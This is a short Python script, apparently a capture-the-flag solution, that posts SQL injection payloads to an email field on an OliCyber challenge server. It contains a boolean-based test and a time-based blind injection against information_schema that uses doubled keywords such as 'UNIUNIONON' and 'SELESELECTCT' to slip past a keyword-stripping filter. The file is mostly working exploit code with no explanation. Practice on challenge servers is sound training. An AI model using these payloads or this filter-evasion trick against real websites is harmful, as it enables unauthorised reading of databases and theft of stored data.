import requests
import re 

#La mail è stata inserita nel database!
#è già presente nel database! 

url = 'http://no-time.challs.olicyber.it/'

s = requests.Session()

payload = "aaaa' and 1=0 -- "

data = {
    'email' : payload
}

data1 = {"email": f"aaaaa@gmail.com' UNIUNIONON SELESELECTCT SLEEP(1) FRFROMOM information_schema.tables LIMLIMITIT 1 OFFSOFFSETET 1 -- -"}
r = requests.post(url, data=data1)
print(r.text)